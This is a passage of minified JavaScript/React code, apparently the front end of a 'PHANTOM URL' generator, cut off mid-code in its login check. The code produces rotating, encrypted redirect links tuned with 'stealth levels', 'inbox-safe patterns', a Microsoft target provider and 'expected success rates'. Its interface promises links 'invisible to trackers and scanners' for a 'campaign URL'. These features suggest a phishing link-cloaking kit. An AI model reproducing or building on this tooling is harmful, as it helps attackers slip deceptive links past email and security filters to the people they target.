dd().generatePhantomUrl(O,pe,{pattern:"intelligent",stealthLevel:"both",encryptionMode:"aes",tier:1,context:{category:"business",targetProvider:"microsoft"}});ye=window.location.origin+se.url,he={pattern:se.pattern,tier:se.tier,expectedSuccessRate:se.expectedSuccessRate,contentType:se.contentType,encryptionMode:se.encryptionMode,securityLevel:se.securityLevel,isQuickAccess:!0,timestamp:Date.now(),rotationCounter:j+1},console.log(" [Generation] Generated quick access URL with inbox-safe patterns:",ye)}catch(V){throw console.error(" [Generation] Quick URL generation failed:",V),new Error(`Quick URL generation failed: ${V.message}`)}}else if(F0(t)&&!c){console.log(" [Generation] Processing standard URL with simple format:",t);try{const O=await new dd().generatePhantomUrl(t,pe,{pattern:"intelligent",stealthLevel:"planA",encryptionMode:"aes",tier:1,context:{category:"corporate",targetProvider:"generic"}});ye=window.location.origin+O.url,he={pattern:O.pattern,tier:O.tier,expectedSuccessRate:O.expectedSuccessRate,contentType:O.contentType,encryptionMode:O.encryptionMode,securityLevel:O.securityLevel,isQuickAccess:!1,timestamp:Date.now(),rotationCounter:j+1},console.log(" [Generation] Generated simple URL with inbox-safe patterns:",ye)}catch(U){throw console.error(" [Generation] Simple URL generation failed:",U),new Error(`Simple URL generation failed: ${U.message}`)}}else if(F0(t)){console.log(" [Generation] Processing URL with advanced options:",t),console.log(" [Generation] Pattern data:",w),console.log(" [Generation] Phantom options:",f);try{let U=await Q();U==="auto"&&(U="intelligent"),console.log(" [Generation] Final mapped pattern:",U),console.log(" [Generation] Rotation counter:",j),console.log(" [Generation] Pattern data:",w==null?void 0:w.name);const V=await new dd().generatePhantomUrl(t,pe,{pattern:"intelligent",stealthLevel:f.stealthLevel,encryptionMode:"auto",tier:f.tier,context:{category:"business",targetProvider:"generic",industry:"technology"}});ye=window.location.origin+V.url,(ye.includes("{")||ye.includes("}"))&&(console.error(" [DEBUG] Placeholder replacement failed in URL:",ye),console.error(" [DEBUG] Raw result from processor:",V)),he={pattern:V.pattern,tier:V.tier,expectedSuccessRate:V.expectedSuccessRate,contentType:V.contentType,encryptionMode:V.encryptionMode,securityLevel:V.securityLevel,timestamp:Date.now(),rotationCounter:j+1,patternName:V.pattern,isAdvanced:!0},console.log(" [Generation] Generated advanced URL:",ye),console.log(" [Generation] Metadata:",he),ne({isValid:!0,issues:[],recommendations:["URL generated with inbox-safe patterns"],riskScore:100-V.expectedSuccessRate,metadata:he}),console.log(" [Validation] URL generated with inbox-safe patterns")}catch(U){throw console.error(" [Generation] Advanced URL generation failed:",U),console.error(" [Generation] Advanced URL generation failed:",U),new Error(`URL generation failed: ${U.message}`)}}else{console.log(" [Validation] Invalid URL format:",t),P({title:"Invalid Format",description:"Please enter a valid URL starting with http:// or https://",variant:"destructive",className:"bg-gradient-to-r from-amber-50 to-amber-100 border-l-4 border-amber-500 text-amber-900 shadow-lg",duration:3e3}),l(!1);return}if(console.log(" [Result] Setting result data:",he),console.log(" [Result] Setting URL:",ye),I>0&&P({title:" New Variation Generated",description:`Rotation #${he.rotationCounter||j+1} with fresh encryption`,className:"bg-gradient-to-r from-cyan-50 to-blue-50 border-l-4 border-cyan-500 text-cyan-800 shadow-lg",duration:2500}),!ye)throw new Error("Generated URL is empty");if(!ye.startsWith(window.location.origin))throw new Error("Generated URL has invalid origin");n(ye),v(he),he&&(R({timestamp:he.timestamp||Date.now(),rotationCounter:he.rotationCounter||j+1,encryptionMode:he.encryptionMode||"aes",patternName:he.patternName||(w==null?void 0:w.name),encryptedPreview:he.encryptedData,varietySeed:he.varietySeed,securityLevel:he.securityLevel||85}),_(he.rotationCounter||j+1),J(Date.now())),setTimeout(()=>{h(!0),console.log(" [UI] Results displayed successfully")},100);const E=he!=null&&he.fallbackUsed?"URL generated using simplified format":w?`${w.name} pattern applied successfully`:"Your premium secure redirect is ready";P({title:" Generation Complete",description:E,className:"bg-gradient-to-r from-emerald-50 to-blue-50 border-l-4 border-emerald-500 text-emerald-800 shadow-lg",duration:4e3})}catch(B){const Y=B instanceof Error?B.message:"Unknown error occurred";console.error(" [Error] URL generation failed:",Y),console.error(" [Error] Full error details:",B);let ee="Unable to complete your secure redirect request",pe="Generation Interrupted";Y.includes("Rate limit")?(pe="Rate Limit Exceeded",ee="Too many requests. Please wait a moment and try again."):Y.includes("Invalid target URL")?(pe="Invalid URL",ee="The provided URL format is not supported."):Y.includes("Database registration failed")?(pe="Database Error",ee="Temporary database issue. Your URL may still work."):Y.includes("Session")?(pe="Authentication Error",ee="Please refresh the page and log in again."):Y.includes("fallback generation failed")&&(pe="System Error",ee="Multiple generation methods failed. Please try again."),P({title:pe,description:`${ee} (Debug: ${Y.substring(0,100)})`,variant:"destructive",className:"bg-gradient-to-r from-red-50 to-rose-100 border-l-4 border-red-600 text-red-900 shadow-lg",duration:6e3})}finally{l(!1),console.log(" [Generation] Process completed")}},$t=async()=>{try{await navigator.clipboard.writeText(r),i(!0),setTimeout(()=>i(!1),2e3),P({title:" Copied to Clipboard",description:"Secure redirect URL is ready to share",className:"bg-gradient-to-r from-blue-50 to-indigo-50 border-l-4 border-indigo-500 text-indigo-800 shadow-lg",duration:2500})}catch{P({title:"Clipboard Action Failed",description:"Unable to copy the secure URL to your clipboard",variant:"destructive",className:"bg-gradient-to-r from-purple-50 to-red-50 border-l-4 border-purple-600 text-purple-900 shadow-lg",duration:3e3})}},Ut=()=>{r&&window.open(r,"_blank")};return a.jsxs("div",{className:"space-y-8 font-jetbrains antialiased",children:[a.jsxs("div",{className:"bg-gradient-to-br from-slate-900/90 via-blue-900/30 to-purple-900/30 backdrop-blur-lg rounded-3xl shadow-2xl border border-cyan-400/40 p-6 sm:p-8 transition-all duration-300 hover:shadow-cyan-300/20 hover:border-cyan-300/60 relative overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 opacity-5",children:a.jsx("div",{className:"absolute inset-0 bg-[linear-gradient(rgba(6,182,212,0.1)_1px,transparent_1px),linear-gradient(90deg,rgba(6,182,212,0.1)_1px,transparent_1px)] bg-[size:20px_20px]"})}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-0.5 bg-gradient-to-r from-transparent via-cyan-400 to-transparent animate-pulse"}),a.jsxs("div",{className:"space-y-7 relative z-10",children:[a.jsxs("div",{className:"space-y-4 max-w-lg mx-auto",children:[a.jsxs("div",{className:"relative group transition-all duration-300",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500/30 to-blue-600/30 rounded-2xl opacity-40 blur-md group-hover:opacity-60 transition duration-500"}),a.jsxs("div",{className:"relative bg-slate-800/60 backdrop-blur-sm rounded-2xl shadow-xl flex items-center overflow-hidden border border-cyan-400/50 group-hover:border-cyan-300/70 transition-all duration-300",children:[a.jsx("div",{className:"pl-5 py-2",children:a.jsx(Hn,{className:"w-6 h-6 text-cyan-400"})}),a.jsx(Ze,{type:"text",placeholder:"Enter Destination URL or Quick Number (1-5)",value:t,onChange:B=>e(B.target.value),onKeyDown:B=>B.key==="Enter"&&Je(),className:"h-14 text-lg border-0 focus:ring-0 pl-4 pr-14 py-3 flex-1 bg-transparent font-jetbrains font-medium w-full text-cyan-50 placeholder:text-cyan-200/50",style:{minWidth:"0",boxShadow:"none"}}),a.jsx("div",{className:"absolute right-5 top-1/2 transform -translate-y-1/2 transition-all duration-300",children:/^\d+$/.test(t)?a.jsx("div",{className:"flex items-center justify-center h-8 w-8 rounded-full bg-gradient-to-br from-amber-400/80 to-orange-500/80 text-white shadow-lg",children:a.jsx(Ge,{className:"w-4 h-4"})}):a.jsx("div",{className:"flex items-center justify-center h-8 w-8 rounded-full bg-gradient-to-br from-cyan-400/80 to-blue-500/80 text-white shadow-lg",children:a.jsx(Bm,{className:"w-4 h-4"})})})]})]}),a.jsxs("div",{className:"flex flex-wrap justify-center items-center gap-2 px-2",children:[a.jsx("div",{className:"hidden sm:block h-px w-8 bg-gradient-to-r from-transparent to-cyan-300/60"}),a.jsx("p",{className:"text-xs sm:text-sm text-cyan-100/80 font-jetbrains font-medium px-1 text-center",children:"Enter URL or use quick numbers 1-5 for instant testing"}),a.jsx("div",{className:"hidden sm:block h-px w-8 bg-gradient-to-r from-cyan-300/60 to-transparent"})]})]}),a.jsxs("div",{className:"relative group/advancedToggle mb-6",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-purple-500/20 via-cyan-500/20 to-blue-500/20 rounded-xl opacity-0 group-hover/advancedToggle:opacity-60 blur-md transition-all duration-500 hidden sm:block"}),a.jsxs("div",{onClick:()=>d(!c),className:"relative z-10 flex items-center gap-3 px-5 py-4 rounded-xl border border-cyan-500/40 bg-slate-800/40 hover:bg-slate-700/50 shadow-lg hover:shadow-cyan-500/20 transition-all duration-300 cursor-pointer group overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-transparent via-cyan-100/10 to-transparent opacity-0 group-hover:opacity-100 transform -translate-x-full group-hover:translate-x-full transition-all duration-1000 ease-out hidden sm:block"}),a.jsxs("div",{className:"relative z-10 flex items-center justify-between w-full",children:[a.jsxs("div",{className:"flex items-center gap-3",children:[a.jsx("div",{className:`${c?"bg-gradient-to-br from-cyan-500/30 to-blue-600/30":"bg-slate-700/50"} rounded-xl p-2.5 transition-all duration-300 shadow-lg`,children:a.jsx(ry,{className:`w-5 h-5 ${c?"text-cyan-200":"text-slate-400"} transition-colors duration-300`})}),a.jsxs("div",{children:[a.jsx("span",{className:`text-base font-jetbrains font-semibold ${c?"text-cyan-200":"text-slate-200"} transition-colors duration-300`,children:c?"Advanced Pattern Selection":"AI Pattern Selection"}),a.jsx("p",{className:"text-sm text-slate-400 mt-0.5",children:c?"Choose specific stealth patterns":"Let AI select optimal patterns"})]})]}),a.jsx("div",{className:`${c?"bg-gradient-to-br from-cyan-500/30 to-blue-600/30 text-cyan-200":"bg-slate-700/50 text-slate-400"} rounded-xl p-2 transition-all duration-300 transform ${c?"rotate-180":"rotate-0"} shadow-lg`,children:a.jsx(Bm,{className:"w-4 h-4"})})]})]})]}),c&&a.jsxs("div",{className:"mb-12 sm:mb-16 animate-in slide-in-from-top-4 duration-500",children:[a.jsx(J3,{selectedPattern:x,onPatternSelect:B=>te((B==null?void 0:B.id)||"auto",B),className:"mb-6"}),a.jsx("div",{className:"relative group/phantomOptions",children:a.jsxs("div",{className:"bg-gradient-to-br from-slate-800/60 via-slate-700/70 to-purple-800/40 rounded-xl p-5 border border-purple-500/30 shadow-lg backdrop-blur-sm overflow-hidden",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-4",children:[a.jsx("div",{className:"bg-gradient-to-br from-purple-500/80 to-indigo-600/80 p-2.5 rounded-xl border border-purple-400/30 shadow-lg",children:a.jsx(lt,{className:"w-5 h-5 text-white"})}),a.jsxs("div",{children:[a.jsx("h3",{className:"text-lg font-bold bg-clip-text text-transparent bg-gradient-to-br from-purple-200 via-cyan-200 to-blue-200",children:"Security Protocol"}),a.jsx("p",{className:"text-purple-200/80 text-sm",children:"Choose your protection level"})]})]}),a.jsx("div",{className:"grid grid-cols-3 gap-3",children:[{id:"normal",name:"Standard",desc:"Basic stealth"},{id:"maximum",name:"Advanced",desc:"High security"},{id:"both",name:"Maximum",desc:"Military grade"}].map(({id:B,name:Y,desc:ee})=>{const pe=f.stealthLevel===B;return a.jsxs("button",{onClick:()=>m({...f,stealthLevel:B}),className:`relative group overflow-hidden ${pe?"bg-gradient-to-br from-purple-500/80 to-indigo-600/80 text-white shadow-lg shadow-purple-400/30 border border-purple-300/50":"bg-slate-800/70 hover:bg-slate-700/80 text-slate-300 border border-slate-600/50 hover:border-purple-400/30"} 
                            rounded-xl py-3 px-2 text-center font-medium transition-all duration-300 hover:shadow-lg transform hover:-translate-y-0.5`,children:[pe&&a.jsx("div",{className:"absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent opacity-60 animate-pulse"}),a.jsxs("div",{className:"relative z-10",children:[a.jsx("div",{className:"text-sm font-semibold",children:Y}),a.jsx("div",{className:"text-xs opacity-80 mt-1",children:ee})]})]},B)})})]})})]}),(T||N||k.length>0)&&a.jsx("div",{className:"mb-6 animate-in slide-in-from-top-4 duration-500",children:a.jsxs("div",{className:"bg-gradient-to-br from-purple-900/20 via-indigo-900/30 to-blue-900/20 backdrop-blur-md rounded-2xl border border-purple-400/30 p-5 relative overflow-hidden",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-4",children:[a.jsx("div",{className:"p-2.5 bg-gradient-to-br from-purple-500 to-indigo-600 rounded-xl shadow-lg shadow-purple-500/25 border border-purple-400/20",children:T?a.jsx(Kj,{className:"w-5 h-5 text-white animate-spin"}):a.jsx(jr,{className:"w-5 h-5 text-white"})}),a.jsxs("div",{children:[a.jsx("h3",{className:"font-bold text-white text-lg",children:"AI Analysis"}),a.jsx("p",{className:"text-sm text-purple-200",children:T?"Analyzing URL and optimizing patterns...":"Smart recommendations ready"})]})]}),N&&a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4 mb-4",children:[a.jsxs("div",{className:"bg-slate-800/40 rounded-xl p-4 border border-slate-600/30",children:[a.jsxs("h4",{className:"text-sm font-medium text-cyan-200 mb-2 flex items-center gap-2",children:[a.jsx(zj,{className:"w-4 h-4"}),"Domain Analysis"]}),a.jsxs("div",{className:"space-y-2 text-sm",children:[a.jsxs("div",{className:"flex justify-between",children:[a.jsx("span",{className:"text-slate-300",children:"Industry:"}),a.jsx("span",{className:"text-cyan-300 capitalize",children:N.industry})]}),a.jsxs("div",{className:"flex justify-between",children:[a.jsx("span",{className:"text-slate-300",children:"Security Level:"}),a.jsx("span",{className:"text-green-300",children:N.security_level})]})]})]}),a.jsxs("div",{className:"bg-slate-800/40 rounded-xl p-4 border border-slate-600/30",children:[a.jsxs("h4",{className:"text-sm font-medium text-cyan-200 mb-2 flex items-center gap-2",children:[a.jsx(lt,{className:"w-4 h-4"}),"Risk Factors"]}),a.jsx("div",{className:"space-y-1",children:N.risk_factors.length>0?N.risk_factors.map((B,Y)=>a.jsx("div",{className:"text-xs text-amber-300 bg-amber-500/10 rounded px-2 py-1",children:B.replace("_"," ")},Y)):a.jsx("div",{className:"text-xs text-green-300",children:"No significant risks detected"})})]})]}),k.length>0&&a.jsxs("div",{className:"bg-slate-800/40 rounded-xl p-4 border border-slate-600/30",children:[a.jsxs("h4",{className:"text-sm font-medium text-cyan-200 mb-3 flex items-center gap-2",children:[a.jsx(Ri,{className:"w-4 h-4"}),"AI Recommendations (",k.length,")"]}),a.jsx("div",{className:"grid grid-cols-1 gap-2",children:k.slice(0,3).map((B,Y)=>a.jsxs("div",{className:"flex items-center justify-between bg-slate-700/30 rounded-lg p-3 border border-slate-600/20",children:[a.jsxs("div",{children:[a.jsx("div",{className:"text-sm font-medium text-white",children:B.patternName}),a.jsx("div",{className:"text-xs text-slate-400",children:B.recommendationReason})]}),a.jsxs("div",{className:"text-right",children:[a.jsxs("div",{className:"text-sm font-bold text-emerald-300",children:[Math.round(B.performanceScore),"%"]}),a.jsx("div",{className:"text-xs text-slate-400",children:"success rate"})]})]},Y))})]})]})}),a.jsxs("div",{className:"relative max-w-lg mx-auto w-full",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500/40 to-purple-600/40 rounded-2xl opacity-50 blur-lg animate-pulse"}),a.jsx(W,{onClick:Je,disabled:!t.trim()||o,className:"w-full h-16 text-lg font-jetbrains font-semibold bg-gradient-to-r from-cyan-500/90 via-blue-600/90 to-purple-700/90 hover:from-cyan-600 hover:via-blue-700 hover:to-purple-800 rounded-2xl shadow-2xl transition-all duration-300 transform hover:scale-[1.02] hover:shadow-cyan-300/40 border border-cyan-400/40 relative overflow-hidden group z-10",children:o?a.jsxs("div",{className:"flex items-center justify-center gap-3",children:[a.jsx("div",{className:"w-6 h-6 border-3 border-white border-t-transparent rounded-full animate-spin"}),a.jsx("span",{className:"animate-pulse font-jetbrains font-bold tracking-wide",children:w?`Applying ${w.name}...`:"Generating PHANTOM URL..."})]}):a.jsxs(a.Fragment,{children:[a.jsx("span",{className:"absolute inset-0 w-full h-full bg-gradient-to-r from-white/10 via-white/0 to-transparent transform translate-x-[-120%] group-hover:translate-x-[120%] transition-all duration-1500 ease-out"}),a.jsxs("div",{className:"flex items-center justify-center gap-4 relative z-10",children:[a.jsx("div",{className:"w-10 h-10 rounded-full bg-gradient-to-br from-cyan-300/80 to-purple-400/80 flex items-center justify-center shadow-lg group-hover:scale-110 transition-all duration-300",children:a.jsx(Ri,{className:"w-5 h-5 text-white group-hover:scale-110 transition-all duration-300"})}),a.jsx("span",{className:"font-jetbrains font-bold tracking-wide group-hover:tracking-wider transition-all duration-300",children:w?`Generate with ${w.name}`:"Generate PHANTOM URL"})]})]})})]})]})]}),u&&a.jsxs("div",{className:"bg-gradient-to-br from-emerald-50 via-white to-green-50 backdrop-blur-md rounded-3xl shadow-2xl border border-emerald-200/30 p-4 sm:p-8 transition-all duration-500 animate-in fade-in-50 slide-in-from-bottom-5 overflow-hidden relative",children:[a.jsx("div",{className:"absolute top-0 right-0 w-64 h-64 bg-gradient-to-br from-green-300/10 to-emerald-400/10 rounded-full blur-3xl -translate-y-1/2 translate-x-1/4 hidden sm:block"}),a.jsx("div",{className:"absolute bottom-0 left-0 w-64 h-64 bg-gradient-to-br from-blue-300/10 to-green-400/10 rounded-full blur-3xl translate-y-1/2 -translate-x-1/4 hidden sm:block"}),a.jsxs("div",{className:"space-y-8 relative z-10",children:[a.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center justify-between gap-4 sm:gap-6",children:[a.jsxs("div",{className:"flex items-center gap-3 sm:gap-4",children:[a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute inset-0 rounded-full bg-gradient-to-r from-green-400 to-emerald-500 opacity-50 group-hover:opacity-70 blur-sm animate-pulse-slow hidden sm:block"}),a.jsxs("div",{className:"h-10 w-10 sm:h-14 sm:w-14 rounded-full bg-gradient-to-br from-green-400 to-emerald-600 flex items-center justify-center shadow-md sm:shadow-lg shadow-green-300/30 relative z-10 border-2 border-white",children:[a.jsx("div",{className:"absolute inset-0 rounded-full bg-gradient-to-r from-transparent via-white/20 to-transparent animate-shine bg-repeat-x bg-[length:30%_100%] hidden sm:block"}),a.jsx(Ti,{className:"w-5 h-5 sm:w-7 sm:h-7 text-white drop-shadow-md"})]})]}),a.jsxs("div",{children:[a.jsx("h3",{className:"text-xl sm:text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-green-700 to-emerald-600 tracking-tight leading-tight",children:w?`${w.name} Applied`:"PHANTOM Link Generated"}),a.jsxs("p",{className:"text-xs sm:text-sm font-medium text-green-600 flex items-center gap-1.5",children:[a.jsx(Ge,{className:"w-3 h-3 sm:w-3.5 sm:h-3.5"}),w?`${w.success_rate}% Success Rate`:"Invisibility Engaged"]})]})]}),g&&a.jsxs("div",{className:"flex flex-wrap gap-2",children:[w&&a.jsxs("div",{className:"inline-flex items-center px-2 sm:px-3 py-1 rounded-full bg-blue-100 border border-blue-200 text-blue-700 text-xs sm:text-sm font-medium",children:[a.jsx(jr,{className:"w-3.5 h-3.5 sm:w-4 sm:h-4 mr-1 sm:mr-2"}),w.category]}),a.jsxs("div",{className:"inline-flex items-center px-2 sm:px-3 py-1 rounded-full bg-purple-100 border border-purple-200 text-purple-700 text-xs sm:text-sm font-medium",children:[a.jsx(Bt,{className:"w-3.5 h-3.5 sm:w-4 sm:h-4 mr-1 sm:mr-2"}),"Protocol: PHANTOM"]})]})]}),A&&a.jsx(fk,{timestamp:A.timestamp,rotationCounter:A.rotationCounter,encryptionMode:A.encryptionMode,patternName:A.patternName,encryptedPreview:A.encryptedPreview,varietySeed:A.varietySeed,securityLevel:A.securityLevel}),a.jsxs("div",{className:"relative group/url transition-all duration-300",children:[a.jsx("div",{className:"absolute -inset-1.5 bg-gradient-to-r from-emerald-200/40 to-green-300/40 rounded-2xl opacity-50 blur-sm group-hover/url:opacity-70 transition-all duration-500 hidden sm:block"}),a.jsxs("div",{className:"relative bg-white rounded-xl sm:rounded-2xl overflow-hidden shadow-md sm:shadow-lg shadow-green-100/50 border border-emerald-100 flex items-center",children:[a.jsx("div",{className:"pl-3 sm:pl-4 py-2 sm:py-3 flex items-center justify-center",children:a.jsxs("div",{className:"relative",children:[a.jsx(Wj,{className:"w-5 h-5 sm:w-6 sm:h-6 text-emerald-600 drop-shadow-sm"}),a.jsx("span",{className:"absolute inset-0 rounded-full animate-ping bg-emerald-400/20 hidden sm:block"})]})}),a.jsx("div",{className:"relative flex-1 flex items-center",children:a.jsx(Ze,{readOnly:!0,value:r,className:"h-10 sm:h-14 text-sm sm:text-base border-0 focus:ring-0 bg-transparent font-medium text-emerald-800 flex-1 pl-2 sm:pl-3 pr-1 sm:pr-2 w-full truncate",style:{minWidth:"0",boxShadow:"none"}})}),a.jsx("div",{className:"pr-2 sm:pr-3",children:a.jsxs(W,{onClick:$t,variant:"ghost",size:"sm",className:"h-8 w-8 sm:h-10 sm:w-10 hover:bg-emerald-100 rounded-lg sm:rounded-xl text-emerald-600 hover:text-emerald-800 transition-all duration-300 relative overflow-hidden group/copy",children:[a.jsx("span",{className:"absolute inset-0 bg-gradient-to-r from-emerald-100/0 to-emerald-100/80 opacity-0 group-hover/copy:opacity-100 transition-opacity duration-300 hidden sm:block"}),a.jsx("div",{className:"relative z-10",children:s?a.jsx(Ti,{className:"h-4 w-4 sm:h-5 sm:w-5 text-emerald-600 animate-in zoom-in-75 duration-300"}):a.jsx(xl,{className:"h-4 w-4 sm:h-5 sm:w-5"})})]})})]}),a.jsx("div",{className:"text-center mt-2",children:a.jsxs("p",{className:"text-xs text-emerald-600/80 flex items-center justify-center gap-1",children:[a.jsx(xl,{className:"w-3 h-3"}),a.jsx("span",{children:"Click copy button above to save your campaign URL"})]})})]}),a.jsxs("div",{className:"relative group/test",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-emerald-300/30 to-green-300/30 rounded-xl opacity-40 blur-sm group-hover/test:opacity-70 group-hover/test:blur transition-all duration-500 hidden sm:block"}),a.jsxs(W,{onClick:Ut,variant:"outline",className:"w-full h-12 sm:h-14 bg-gradient-to-r from-emerald-50 to-green-50 border border-emerald-200 hover:border-emerald-300 text-emerald-700 hover:text-emerald-800 rounded-lg sm:rounded-xl font-semibold text-sm sm:text-base tracking-wide transition-all duration-300 hover:shadow-lg flex items-center justify-center gap-2 sm:gap-3 relative overflow-hidden group/button z-10",children:[a.jsx("div",{className:"absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-emerald-100/50 to-transparent opacity-0 group-hover/button:opacity-100 transform -translate-x-full group-hover/button:translate-x-full transition-all duration-1000 ease-out hidden sm:block"}),a.jsxs("div",{className:"flex items-center justify-center gap-2 sm:gap-3 relative z-10",children:[a.jsx("div",{className:"bg-emerald-100 rounded-full p-1 sm:p-1.5",children:a.jsx(Uj,{className:"w-3.5 h-3.5 sm:w-4 sm:h-4 text-emerald-700"})}),a.jsx("span",{children:"Launch URL"}),a.jsx("div",{className:"bg-emerald-100 rounded-full p-1 sm:p-1.5 animate-pulse-slow",children:a.jsx(jr,{className:"w-3.5 h-3.5 sm:w-4 sm:h-4 text-emerald-700"})})]})]})]}),a.jsx("div",{className:"relative group/variation",children:a.jsx(W,{onClick:()=>Je(),variant:"outline",disabled:o,className:"w-full h-12 bg-gradient-to-r from-blue-50 to-cyan-50 border border-blue-200 hover:border-blue-300 text-blue-700 hover:text-blue-800 rounded-xl font-semibold text-sm tracking-wide transition-all duration-300 hover:shadow-lg flex items-center justify-center gap-3 relative overflow-hidden group/button z-10",children:a.jsxs("div",{className:"flex items-center justify-center gap-3 relative z-10",children:[a.jsx("div",{className:"bg-blue-100 rounded-full p-1.5",children:a.jsx(ty,{className:"w-4 h-4 text-blue-700"})}),a.jsx("span",{children:"Generate New Variation"}),I>0&&a.jsxs("div",{className:"text-xs bg-blue-100 px-2 py-1 rounded-full",children:["#",j+1]})]})})}),a.jsxs("div",{className:"relative group/security",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-blue-100/50 to-emerald-100/50 rounded-xl opacity-50 blur-md group-hover/security:opacity-70 transition-all duration-500 hidden sm:block"}),a.jsxs("div",{className:"bg-gradient-to-br from-white via-white to-emerald-50/30 backdrop-blur-md rounded-xl p-3 sm:p-5 border border-emerald-100 shadow-md sm:shadow-lg shadow-emerald-100/10 relative z-10 overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 opacity-5 hidden sm:block",children:a.jsx("div",{className:"absolute top-0 left-0 w-full h-full bg-[radial-gradient(circle_at_16px_16px,#e0e0e0_2px,transparent_0)] bg-[size:24px_24px]"})}),a.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center justify-between gap-2 sm:gap-0 mb-3 sm:mb-4",children:[a.jsxs("div",{className:"flex items-center gap-2 sm:gap-3",children:[a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute inset-0 rounded-full bg-purple-400 opacity-20 group-hover:opacity-40 blur-sm animate-pulse-slow hidden sm:block"}),a.jsx("div",{className:"h-8 w-8 sm:h-9 sm:w-9 rounded-full bg-gradient-to-br from-purple-500 to-indigo-500 flex items-center justify-center shadow-sm sm:shadow-md shadow-purple-200/50 relative z-10 border border-white/80",children:a.jsx(vl,{className:"w-3.5 h-3.5 sm:w-4 sm:h-4 text-white drop-shadow-sm"})})]}),a.jsx("h4",{className:"text-sm sm:text-base font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-700 to-indigo-700",children:"PHANTOM Protocol Active"})]}),a.jsxs("div",{className:"bg-gradient-to-r from-purple-100 to-indigo-100 rounded-full px-2.5 sm:px-4 py-1 sm:py-1.5 text-[10px] sm:text-xs font-bold text-purple-700 flex items-center gap-1 sm:gap-1.5 shadow-sm border border-purple-200/50",children:[a.jsx(Ge,{className:"w-3 h-3 sm:w-3.5 sm:h-3.5 text-purple-600"})," Stealth Mode Engaged"]})]}),a.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4",children:[a.jsxs("div",{className:"flex items-center gap-2 sm:gap-3 p-2.5 sm:p-3 rounded-lg bg-gradient-to-r from-white to-purple-50/50 hover:from-white hover:to-purple-100/50 border border-purple-100/50 transition-all duration-300 transform hover:translate-y-[-2px] hover:shadow-md group/item",children:[a.jsx("div",{className:"rounded-full bg-purple-100 p-1.5 sm:p-2 group-hover/item:bg-purple-200 transition-colors duration-300",children:a.jsx(vl,{className:"w-3.5 h-3.5 sm:w-4 sm:h-4 text-purple-600"})}),a.jsxs("div",{children:[a.jsx("div",{className:"text-sm sm:text-base font-medium text-slate-800",children:"Ghost Protocol"}),a.jsx("div",{className:"text-[10px] sm:text-xs text-slate-600",children:"Makes your links invisible to trackers and scanners"})]})]}),a.jsxs("div",{className:"flex items-center gap-2 sm:gap-3 p-2.5 sm:p-3 rounded-lg bg-gradient-to-r from-white to-indigo-50/50 hover:from-white hover:to-indigo-100/50 border border-indigo-100/50 transition-all duration-300 transform hover:translate-y-[-2px] hover:shadow-md group/item",children:[a.jsx("div",{className:"rounded-full bg-indigo-100 p-1.5 sm:p-2 group-hover/item:bg-indigo-200 transition-colors duration-300",children:a.jsx(Bt,{className:"w-3.5 h-3.5 sm:w-4 sm:h-4 text-indigo-600"})}),a.jsxs("div",{children:[a.jsx("div",{className:"text-sm sm:text-base font-medium text-slate-800",children:"Neural Firewall"}),a.jsx("div",{className:"text-[10px] sm:text-xs text-slate-600",children:"AI-powered shields that adapt to new threats"})]})]}),a.jsxs("div",{className:"flex items-center gap-2 sm:gap-3 p-2.5 sm:p-3 rounded-lg bg-gradient-to-r from-white to-blue-50/50 hover:from-white hover:to-blue-100/50 border border-blue-100/50 transition-all duration-300 transform hover:translate-y-[-2px] hover:shadow-md group/item",children:[a.jsx("div",{className:"rounded-full bg-blue-100 p-1.5 sm:p-2 group-hover/item:bg-blue-200 transition-colors duration-300",children:a.jsx(e_,{className:"w-3.5 h-3.5 sm:w-4 sm:h-4 text-blue-600"})}),a.jsxs("div",{children:[a.jsx("div",{className:"text-sm sm:text-base font-medium text-slate-800",children:"Threat Radar"}),a.jsx("div",{className:"text-[10px] sm:text-xs text-slate-600",children:"Scans for bots and malicious activity in real-time"})]})]}),a.jsxs("div",{className:"flex items-center gap-2 sm:gap-3 p-2.5 sm:p-3 rounded-lg bg-gradient-to-r from-white to-teal-50/50 hover:from-white hover:to-teal-100/50 border border-teal-100/50 transition-all duration-300 transform hover:translate-y-[-2px] hover:shadow-md group/item",children:[a.jsx("div",{className:"rounded-full bg-teal-100 p-1.5 sm:p-2 group-hover/item:bg-teal-200 transition-colors duration-300",children:a.jsx(Dj,{className:"w-3.5 h-3.5 sm:w-4 sm:h-4 text-teal-600"})}),a.jsxs("div",{children:[a.jsx("div",{className:"text-sm sm:text-base font-medium text-slate-800",children:"Quantum Shield"}),a.jsx("div",{className:"text-[10px] sm:text-xs text-slate-600",children:"Deflects attacks using multi-dimensional encryption"})]})]})]})]})]}),a.jsx("div",{className:"mt-8",children:a.jsx(x4,{result:K,isLoading:!1,url:r})})]})]}),a.jsx("div",{className:"text-center space-y-3"})]})},v4=({onLoginSuccess:t})=>{const[e,r]=p.useState(""),[n,s]=p.useState(""),[i,o]=p.useState(!1),[l,c]=p.useState(!1),[d,u]=p.useState(""),[h,f]=p.useState(!1),[m,g]=p.useState(!1),[v,w]=p.useState(null),[y,x]=p.useState(!1),[b,j]=p.useState(null);p.useEffect(()=>{console.log(" Auth check on mount");const C=localStorage.getItem("license_session_token"),T=sessionStorage.getItem("redirect_system_authenticated"),M=sessionStorage.getItem("password_authenticated");console.log(" Auth 